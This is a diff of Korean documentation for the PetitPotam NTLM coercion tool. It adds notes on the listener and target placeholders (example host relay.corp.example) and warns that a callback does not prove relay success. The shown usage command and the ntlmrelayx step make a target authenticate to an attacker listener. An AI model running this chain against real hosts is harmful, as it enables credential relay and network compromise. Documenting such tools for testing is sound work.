@@ -20,8 +20,11 @@ PetitPotam은 Windows의 MS-EFSRPC 인터페이스를 호출해 대상 시스템
 - 실행 위치: 대상의 MS-EFSRPC에 접근 가능한 Linux 또는 Windows 호스트
 - 필요한 입력: 인증을 받을 listener 주소와 대상 호스트 주소
 - 실행 순서: `ntlmrelayx` 같은 수신·relay listener를 먼저 준비한다.
+- listener 주소는 대상이 callback할 수 있는 IP/FQDN(예: `relay.corp.example`)이고 `<TARGET>`은 MS-EFSRPC endpoint의 host다. callback 수신은 relay action의 인증·인가 또는 후속 상태 변경을 보장하지 않는다.
 
 ## 표준 사용법
+
+`<LISTENER>`는 target이 callback할 relay listener address, `<TARGET>`은 MS-EFSRPC host다. listener를 먼저 준비한 뒤 callback output을 확인하며, callback은 relay target에서의 authentication·authorization 또는 state change를 뜻하지 않는다.
 
 ```bash
 python3 PetitPotam.py <LISTENER_HOST> <TARGET_HOST>
